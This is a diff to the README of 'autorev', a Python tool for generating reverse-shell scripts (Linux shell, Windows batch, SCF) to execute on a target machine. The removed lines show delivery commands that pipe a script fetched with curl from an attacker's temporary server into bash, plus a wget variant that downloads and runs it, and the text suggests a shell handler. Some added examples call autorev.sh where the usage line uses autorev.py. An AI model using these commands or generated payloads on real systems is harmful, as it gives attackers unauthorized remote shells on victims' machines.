@@ -1,16 +1,16 @@
 # autorev.sh  
-The Pythone Script will generate a (.)sh file with reverse shell codes then you can execute the script on the target  
-## Generating Usage  
+The Pythone Script will generate a (.)extensino file with reverse shell codes then you can execute the script on the target [support windows and linux both]
+## Generating linux  
 ```
-python3 autorev.py -i <your-ip> -p <your-port>
+python3 autorev.py -i <your-ip> -p <your-port> -o <sh-file-name> -f lin
 ```
-## Using It On Target  
-### Curl  
+## Generating Windows
 ```
-curl <your-temp-server-ip>/autorev.sh | bash
+python3 autorev.sh -i <your-ip> -p <your-port> -o <batch-file-name> -f win
 ```
-### Wget  
+### Generating scf
 ```
-wget <your-temp-server-ip>/autorev.sh -O /tmp/autorev.sh && bash /tmp/autorev.sh
+python3 autorev.sh -i <your-ip> -p <your-port> -o <scf-file-name> -f scf
 ```
-### Suggested shell handler - [penelope](https://github.com/brightio/penelope)  
+All Usage commands will be also generated and print according to the given switches
+### Suggested shell handler - [penelope](https://github.com/brightio/penelope) [Only for linux]
